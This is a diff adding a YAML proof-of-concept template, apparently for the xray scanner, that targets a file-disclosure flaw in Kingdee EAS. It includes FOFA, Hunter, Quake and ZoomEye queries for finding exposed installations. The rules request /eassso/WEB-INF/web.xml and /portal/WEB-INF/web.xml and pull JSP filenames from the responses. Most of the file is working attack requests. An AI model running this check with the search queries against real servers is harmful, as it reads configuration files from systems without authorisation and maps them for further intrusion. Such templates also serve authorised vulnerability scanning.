@@ -1,0 +1,58 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="Kingdee-EAS"
+    hunter-query: web.body="/eassso/images/"
+    quake-query: app:"金蝶-EAS"
+    zoomeye-query: app:"金蝶 EAS"
+    threatbook-query:
+    cve: 
+    cnvd:
+    tips:
+    
+name: poc-yaml-Kingdee-eassso-porta-file-down
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+rules:
+  r0:
+    request:
+      method: GET
+      cache: true
+      path: /eassso/WEB-INF/web.xml
+      follow_redirects: false      
+      headers:
+        Content-Type: application/xml
+      body:
+    expression: >-
+      response.status == 200 && response.body_string.contains("xml version")
+
+    output:
+      search: |-
+        "(?P<filename>\\w+.jsp)".bsubmatch(response.body)
+      filename: search["filename"]
+      search1: |-
+        "(?P<newpath>ico.*jsp)".bsubmatch(response.body)
+      newpath: search["newpath"]
+
+  r1:
+    request:
+      method: GET
+      cache: true
+      path: /portal/WEB-INF/web.xml
+      follow_redirects: false      
+      headers:
+        Content-Type: application/xml
+      body:
+    expression: >-
+      response.status == 200 && response.body_string.contains("xml version")
+
+expression: r0() || r1()
